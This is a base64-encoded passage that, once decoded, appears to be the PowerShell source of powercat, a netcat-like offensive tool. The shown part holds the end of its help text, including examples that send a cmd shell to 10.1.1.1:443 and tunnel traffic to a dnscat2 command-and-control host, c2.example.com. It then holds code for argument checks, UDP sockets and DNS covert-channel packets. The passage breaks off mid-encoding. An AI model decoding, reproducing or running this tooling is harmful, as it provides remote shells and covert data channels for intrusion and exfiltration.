2hlbGwsIGFuZCBlbmFibGUgdmVyYm9zaXR5LgogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA0NDMgLWUgY21kIC12CiAgCiAgQ29ubmVjdCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sIGFuZCBzZW5kIGRucyBxdWVyaWVzCiAgdG8gdGhlIGRucyBzZXJ2ZXIgb24gMTAuMS4xLjEgcG9ydCA1My4KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjEgLXAgNTMgLWRucyBjMi5leGFtcGxlLmNvbQogIAogIFNlbmQgYSBmaWxlIHRvIDEwLjEuMS4xNSBwb3J0IDgwMDAuCiAgICAgIHBvd2VyY2F0IC1jIDEwLjEuMS4xNSAtcCA4MDAwIC1pIEM6XGlucHV0ZmlsZQogIAogIFdyaXRlIHRoZSBkYXRhIHNlbnQgdG8gdGhlIGxvY2FsIGxpc3RlbmVyIG9uIHBvcnQgNDQ0NCB0byBDOlxvdXRmaWxlCiAgICAgIHBvd2VyY2F0IC1sIC1wIDQ0NDQgLW9mIEM6XG91dGZpbGUKICAKICBMaXN0ZW4gb24gcG9ydCA4MDAwIGFuZCByZXBlYXRlZGx5IHNlcnZlciBhIHBvd2Vyc2hlbGwgc2hlbGwuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLWVwIC1yZXAKICAKICBSZWxheSB0cmFmZmljIGNvbWluZyBpbiBvbiBwb3J0IDgwMDAgb3ZlciB0Y3AgdG8gcG9ydCA5MDAwIG9uIDEwLjEuMS4xIG92ZXIgdGNwLgogICAgICBwb3dlcmNhdCAtbCAtcCA4MDAwIC1yIHRjcDoxMC4xLjEuMTo5MDAwCiAgICAgIAogIFJlbGF5IHRyYWZmaWMgY29taW5nIGluIG9uIHBvcnQgODAwMCBvdmVyIHRjcCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sCiAgc2VuZGluZyBxdWVyaWVzIHRvIDEwLjEuMS4xIHBvcnQgNTMuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgZG5zOjEwLjEuMS4xOjUzOmMyLmV4YW1wbGUuY29tCiIgICAKICAgIGlmICggJHNzbCkge1dyaXRlLUhvc3QgIkhvbGEifQogICAgaWYgKCRoKSB7cmV0dXJuICRIZWxwfQogICAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIyMjIyMgVkFMSURBVEUgQVJHUyAjIyMjIyMjIyMjIyMjIyMKICAgICRnbG9iYWw6VmVyYm9zZSA9ICRWZXJib3NlCiAgICBpZiAoJG9mIC1uZSAnJykgeyRvID0gJ0J5dGVzJ30KICAgIGlmICgkZG5zIC1lcSAiIikgewogICAgICAgIGlmICgoKCRjIC1lcSAiIikgLWFuZCAoISRsKSkgLW9yICgoJGMgLW5lICIiKSAtYW5kICRsKSkge3JldHVybiAiWW91IG11c3Qgc2VsZWN0IGVpdGhlciBjbGllbnQgbW9kZSAoLWMpIG9yIGxpc3RlbiBtb2RlICgtbCkuIn0KICAgICAgICBpZiAoJHAgLWVxICIiKSB7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9CiAgICB9CiAgICBpZiAoKCgoJHIgLW5lICIiKSAtYW5kICgkZSAtbmUgIiIpKSAtb3IgKCgkZSAtbmUgIiIpIC1hbmQgKCRlcCkpKSAtb3IgKCgkciAtbmUgIiIpIC1hbmQgKCRlcCkpKSB7cmV0dXJuICJZb3UgY2FuIG9ubHkgcGljayBvbmUgb2YgdGhlc2U6IC1lLCAtZXAsIC1yIn0KICAgIGlmICgoJGkgLW5lICRudWxsKSAtYW5kICgoJHIgLW5lICIiKSAtb3IgKCRlIC1uZSAiIikpKSB7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9CiAgICBpZiAoJGwpIHsKICAgICAgICAkRmFpbHVyZSA9ICRGYWxzZQogICAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZiAoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHApIHtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHAgKyAiIGlzIGFscmVhZHkgaW4gdXNlLiIpIDsgJEZhaWx1cmUgPSAkVHJ1ZX19CiAgICAgICAgaWYgKCRGYWlsdXJlKSB7YnJlYWt9CiAgICB9CiAgICBpZiAoJHIgLW5lICIiKSB7CiAgICAgICAgaWYgKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpIHsKICAgICAgICAgICAgJEZhaWx1cmUgPSAkRmFsc2UKICAgICAgICAgICAgbmV0c3RhdCAtbmEgfCBTZWxlY3QtU3RyaW5nIExJU1RFTklORyB8ICUge2lmICgoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKSB7V3JpdGUtT3V0cHV0ICgiVGhlIHNlbGVjdGVkIHBvcnQgIiArICRyLnNwbGl0KCI6IilbMV0gKyAiIGlzIGFscmVhZHkgaW4gdXNlLiIpIDsgJEZhaWx1cmUgPSAkVHJ1ZX19CiAgICAgICAgICAgIGlmICgkRmFpbHVyZSkge2JyZWFrfQogICAgICAgIH0KICAgIH0KICAgICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBTZXR1cF9VRFAgewogICAgICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgICAgIGlmICgkZ2xvYmFsOlZlcmJvc2UpIHskVmVyYm9zZSA9ICRUcnVlfQogICAgICAgICRjLCAkbCwgJHAsICR0ID0gJEZ1bmNTZXR1cFZhcnMKICAgICAgICAkRnVuY1ZhcnMgPSBAe30KICAgICAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICAgICBpZiAoJGwpIHsKICAgICAgICAgICAgJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDY1NTM2CiAgICAgICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpBbnkpLCAkcAogICAgICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVURQQ2xpZW50ICRwCiAgICAgICAgICAgICRQYWNrZXRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuSVBQYWNrZXRJbmZvcm1hdGlvbgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSBwb3J0ICIgKyAkcCArICIgW3VkcF0iKQogICAgICAgICAgICAkQ29ubmVjdEhhbmRsZSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZU1lc3NhZ2VGcm9tKCRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlciwgMCwgNjU1MzYsIFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lLCBbcmVmXSRFbmRQb2ludCwgJG51bGwsICRudWxsKQogICAgICAgICAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgIHdoaWxlICgkVHJ1ZSkgewogICAgICAgICAgICAgICAgaWYgKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChAKDE3LCAyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBVRFAgU2V0dXAuLi4iCiAgICAgICAgICAgICAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkgewogICAgICAgICAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGltZW91dCEiIDsgYnJlYWsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdEhhbmRsZS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAgICAgICAgICRTb2NrZXRCeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5FbmRSZWNlaXZlTWVzc2FnZUZyb20oJENvbm5lY3RIYW5kbGUsIFtyZWZdKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSwgW3JlZl0kRW5kUG9pbnQsIFtyZWZdJFBhY2tldEluZm8pCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJEVuZFBvaW50LlBvcnQgKyAiKSIpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTb2NrZXRCeXRlc1JlYWQgLWd0IDApIHticmVha30KICAgICAgICAgICAgICAgICAgICBlbHNlIHticmVha30KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICAkRnVuY1ZhcnNbIkluaXRpYWxDb25uZWN0aW9uQnl0ZXMiXSA9ICRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlclswLi4oW2ludF0kU29ja2V0Qnl0ZXNSZWFkIC0gMSldCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoISRjLkNvbnRhaW5zKCIuIikpIHsKICAgICAgICAgICAgICAgICRJUExpc3QgPSBAKCkKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAlIHskSVBMaXN0ICs9ICRfLklQQWRkcmVzc1RvU3RyaW5nfQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIk5hbWUgIiArICRjICsgIiByZXNvbHZlZCB0byBhZGRyZXNzICIgKyAkSVBMaXN0WzBdKQogICAgICAgICAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRJUExpc3RbMF0pKSwgJHAKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkYykpLCAkcAogICAgICAgICAgICB9CiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0gPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VRFBDbGllbnQKICAgICAgICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5Db25uZWN0KCRjLCAkcCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIlNlbmRpbmcgVURQIHRyYWZmaWMgdG8gIiArICRjICsgIiBwb3J0ICIgKyAkcCArICIuLi4iKQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiVURQOiBNYWtlIHN1cmUgdG8gc2VuZCBzb21lIGRhdGEgc28gdGhlIHNlcnZlciBjYW4gbm90aWNlIHlvdSEiKQogICAgICAgIH0KICAgICAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9IDY1NTM2CiAgICAgICAgJEZ1bmNWYXJzWyJFbmRQb2ludCJdID0gJEVuZFBvaW50CiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVGcm9tKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sIChbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksIFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdLCAkbnVsbCwgJG51bGwpCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfVURQIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgIGlmICgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0sIFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdKQogICAgICAgICAgICBpZiAoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCkge2JyZWFrfQogICAgICAgICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkIC0gMSldCiAgICAgICAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuQmVnaW5SZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAoW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRGbGFnc106Ok5vbmUpLCBbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwgJG51bGwsICRudWxsKQogICAgICAgIH0KICAgICAgICByZXR1cm4gJERhdGEsICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gV3JpdGVEYXRhX1VEUCB7CiAgICAgICAgcGFyYW0oJERhdGEsICRGdW5jVmFycykKICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5TZW5kVG8oJERhdGEsICRGdW5jVmFyc1siRW5kUG9pbnQiXSkgfCBPdXQtTnVsbAogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIENsb3NlX1VEUCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgfQogICAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIyMjIyMgRE5TIEZVTkNUSU9OUyAjIyMjIyMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIFNldHVwX0ROUyB7CiAgICAgICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAgICAgZnVuY3Rpb24gQ29udmVydFRvLUhleEFycmF5IHsKICAgICAgICAgICAgcGFyYW0oJFN0cmluZykKICAgICAgICAgICAgJEhleCA9IEAoKQogICAgICAgICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmICgkXy5MZW5ndGggLWVxIDEpIHsiMCIgKyBbc3RyaW5nXSRffSBlbHNlIHtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQogICAgICAgICAgICByZXR1cm4gJEhleAogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIFNlbmRQYWNrZXQgewogICAgICAgICAgICBwYXJhbSgkUGFja2V0LCAkRE5TU2VydmVyLCAkRE5TUG9ydCkKICAgICAgICAgICAgJENvbW1hbmQgPSAoInNldCB0eXBlPVRYVGBuc2VydmVyICRETlNTZXJ2ZXJgbnNldCBwb3J0PSRETlNQb3J0YG5zZXQgZG9tYWluPS5jb21gbnNldCByZXRyeT0xYG4iICsgJFBhY2tldCArICJgbmV4aXQiKQogICAgICAgICAgICAkcmVzdWx0ID0gKCRDb21tYW5kIHwgbnNsb29rdXAgMj4mMSB8IE91dC1TdHJpbmcpCiAgICAgICAgICAgIGlmICgkcmVzdWx0LkNvbnRhaW5zKCciJykpIHtyZXR1cm4gKFtyZWdleF06Ok1hdGNoKCRyZXN1bHQucmVwbGFjZSgiYmlvPSIsICIiKSwgJyg/PD0iKVteIl0qKD89IiknKS5WYWx1ZSl9CiAgICAgICAgICAgIGVsc2Uge3JldHVybiAxfQogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIENyZWF0ZV9TWU4gewogICAgICAgICAgICBwYXJhbSgkU2Vzc2lvbklkLCAkU2VxTnVtLCAkVGFnLCAkRG9tYWluKQogICAgICAgICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMCIgKyAkU2Vzc2lvbklkICsgJFNlcU51bSArICIwMDAwIiArICREb21haW4pCiAgICAgICAgfQogICAgCiAgICAgICAgZnVuY3Rpb24gQ3JlYXRlX0ZJTiB7CiAgICAgICAgICAgIHBhcmFtKCRTZXNzaW9uSWQsICRUYWcsICREb21haW4pCiAgICAgICAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAyIiArICRTZXNzaW9uSWQgKyAiMDAiICsgJERvbWFpbikKICAgICAgICB9CiAgICAKICAgICAgICBmdW5jdGlvbiBDcmVhdGVfTVNHIHsKICAgICAgICAgICAgcGFyYW0oJFNlc3Npb25JZCwgJFNlcU51bSwgJEFja25vd2xlZGdlbWVudE51bWJlciwgJERhdGEsICRUYWcsICREb21haW4pCiAgICAgICAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAxIiArICRTZXNzaW9uSWQgKyAkU2VxTnVtICsgJEFja25vd2xlZGdlbWVudE51bWJlciArICREYXRhICsgJERvbWFpbikKICAgICAgICB9CiAgICAKICAgICAgICBmdW5jdGlvbiBEZWNvZGVQYWNrZXQgewogICAgICAgICAgICBwYXJhbSgkUGFja2V0KQogICAgICAKICAgICAgICAgICAgaWYgKCgoJFBhY2tldC5MZW5ndGgpICUgMiAtZXEgMSkgLW9yICgkUGFja2V0Lkxlbmd0aCAtZXEgMCkpIHtyZXR1cm4gMX0KICAgICAgICAgICAgJEFja25vd2xlZGdlbWVudE51bWJlciA9ICgkUGFja2V0WzEwLi4xM10gLWpvaW4gIiIpCiAgICAgICAgICAgICRTZXFOdW0gPSAoJFBhY2tldFsxNC4uMTddIC1qb2luICIiKQogICAgICAgICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpCiAgICAgIAogICAgICAgICAgICBpZiAoJFBhY2tldC5MZW5ndGggLWd0IDE4KSB7CiAgICAgICAgICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXQuU3Vic3RyaW5nKDE4KQogICAgICAgICAgICAgICAgd2hpbGUgKCRQYWNrZXRFbGltLkxlbmd0aCAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgICRSZXR1cm5pbmdEYXRhICs9IFtieXRlW11dW0NvbnZlcnRdOjpUb0ludDE2KCgkUGFja2V0RWxpbVswLi4xXSAtam9pbiAiIiksIDE2KQogICAgICAgICAgICAgICAgICAgICRQYWNrZXRFbGltID0gJFBhY2tldEVsaW0uU3Vic3RyaW5nKDIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIHJldHVybiAkUGFja2V0LCAkUmV0dXJuaW5nRGF0YSwgJEFja25vd2xlZGdlbWVudE51bWJlciwgJFNlcU51bQogICAgICAgIH0KICAgIAogICAgICAgIGZ1bmN0aW9uIEFja25vd2xlZGdlRGF0YSB7CiAgICAgICAgICAgIHBhcmFtKCRSZXR1cm5pbmdEYXRhLCAkQWNrbm93bGVkZ2VtZW50TnVtYmVyKQogICAgICAgICAgICAkSGV4ID0gW3N0cmluZ10oInswOnh9IiAtZiAoKFt1aW50MTZdKCIweCIgKyAkQWNrbm93bGVkZ2VtZW50TnVtYmVyKSArICRSZXR1cm5pbmdEYXRhLkxlbmd0aCkgJSA2NTUzNSkpCiAgICAgICAgICAgIGlmICgkSGV4Lkxlbmd0aCAtbmUgNCkgeyRIZXggPSAoKCIwIiAqICg0IC0gJEhleC5MZW5ndGgpKSArICRIZXgpfQogICAgICAgICAgICByZXR1cm4gJEhleAogICAgICAgIH0KICAgICAgICAkRnVuY1ZhcnMgPSBAe30KICAgICAgICAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCAkRnVuY1ZhcnNbIkROU1BvcnQiXSwgJEZ1bmNWYXJzWyJEb21haW4iXSwgJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0gPSAkRnVuY1NldHVwVmFycwogICAgICAgIGlmICgkRnVuY1ZhcnNbIkROU1BvcnQiXSAtZXEgJycpIHskRnVuY1ZhcnNbIkROU1BvcnQiXSA9ICI1MyJ9CiAgICAgICAgJEZ1bmNWYXJzWyJUYWciXSA9ICIiCiAgICAgICAgJEZ1bmNWYXJzWyJEb21haW4iXSA9ICgiLiIgKyAkRnVuY1ZhcnNbIkRvbWFpbiJdKQogICAgCiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9TWU59CiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9NU0d9CiAgICAgICAgJEZ1bmNWYXJzWyJDcmVhdGVfRklOIl0gPSAke2Z1bmN0aW9uOkNyZWF0ZV9GSU59CiAgICAgICAgJEZ1bmNWYXJzWyJEZWNvZGVQYWNrZXQiXSA9ICR7ZnVuY3Rpb246RGVjb2RlUGFja2V0fQogICAgICAgICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gPSAke2Z1bmN0aW9uOkNvbnZlcnRUby1IZXhBcnJheX0KICAgICAgICAkRnVuY1ZhcnNbIkFja0RhdGEiXSA9ICR7ZnVuY3Rpb246QWNrbm93bGVkZ2VEYXRhfQogICAgICAgICRGdW5jVmFyc1siU2VuZFBhY2tldCJdID0gJHtmdW5jdGlvbjpTZW5kUGFja2V0fQogICAgICAgICRGdW5jVmFyc1siU2Vzc2lvbklkIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgICAgICRGdW5jVmFyc1siU2VxTnVtIl0gPSAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKQogICAgICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgICRGdW5jVmFyc1siRmFpbHVyZXMiXSA9IDAKICAgIAogICAgICAgICRTWU5QYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siVGFnIl0sICRGdW5jVmFyc1siRG9tYWluIl0pKQogICAgICAgICRSZXNwb25zZVBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFNZTlBhY2tldCwgJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwgJEZ1bmNWYXJzWyJETlNQb3J0Il0pKQogICAgICAgICREZWNvZGVkUGFja2V0ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siRGVjb2RlUGFja2V0Il0gLUFyZ3VtZW50TGlzdCBAKCRSZXNwb25zZVBhY2tldCkpCiAgICAgICAgaWYgKCREZWNvZGVkUGFja2V0IC1lcSAxKSB7cmV0dXJuICJCYWQgU1lOIHJlc3BvbnNlLiBFbnN1cmUgeW91ciBzZXJ2ZXIgaXMgc2V0IHVwIGNvcnJlY3RseS4ifQogICAgICAgICRSZXR1cm5pbmdEYXRhID0gJERlY29kZWRQYWNrZXRbMV0KICAgICAgICBpZiAoJFJldHVybmluZ0RhdGEgLW5lICIiKSB7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQogICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQogICAgICAgICRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSA9ICgyNDQgLSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siQWNrTnVtIl0sICIiLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKSkuTGVuZ3RoKQogICAgICAgIGlmICgkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApIHtyZXR1cm4gIkRvbWFpbiBuYW1lIGlzIHRvbyBsb25nLiJ9CiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfRE5TIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAKICAgICAgICAkUGFja2V0c0RhdGEgPSBAKCkKICAgICAgICAkUGFja2V0RGF0YSA9ICIiCiAgICAKICAgICAgICBpZiAoJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgJEhleCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNvbnZlcnRUby1IZXhBcnJheSJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIklucHV0RGF0YSJdKSkKICAgICAgICAgICAgJFNlY3Rpb25Db3VudCA9IDAKICAgICAgICAgICAgJFBhY2tldENvdW50ID0gMAogICAgICAgICAgICBmb3JlYWNoICgkQ2hhciBpbiAkSGV4KSB7CiAgICAgICAgICAgICAgICBpZiAoJFNlY3Rpb25Db3VudCAtZ2UgMzApIHsKICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMAogICAgICAgICAgICAgICAgICAgICRQYWNrZXREYXRhICs9ICIuIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQYWNrZXRDb3VudCAtZ2UgKCRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSkpIHsKICAgICAgICAgICAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJ